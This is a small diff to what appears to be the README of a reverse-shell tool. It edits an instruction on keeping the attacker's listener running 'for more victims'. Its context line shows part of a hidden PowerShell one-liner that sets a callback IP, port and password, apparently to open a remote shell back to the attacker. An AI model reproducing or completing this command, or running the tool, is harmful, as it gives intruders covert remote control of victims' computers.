@@ -70,7 +70,7 @@ powershell -nop -w hidden -c "$IP='10.0.13.7'; $P=2222; $pw='mysecretpass'; $cb=
 ```
 
 ------------------------------
-## AFTER RUNNING "EXIT" IN THE ATTACKER, PRESS ENTER SO IT LISTENS FOR MORE VICTIMS AUTOMATICALLY
+## AFTER RUNNING "EXIT" IN THE ATTACKER, PRESS ENTER TWICE SO IT LISTENS FOR MORE VICTIMS AUTOMATICALLY
 
 ## ⚠️ Recovery
 If the session ends and your local terminal behaves strangely (doesn't show typing), restore it with:
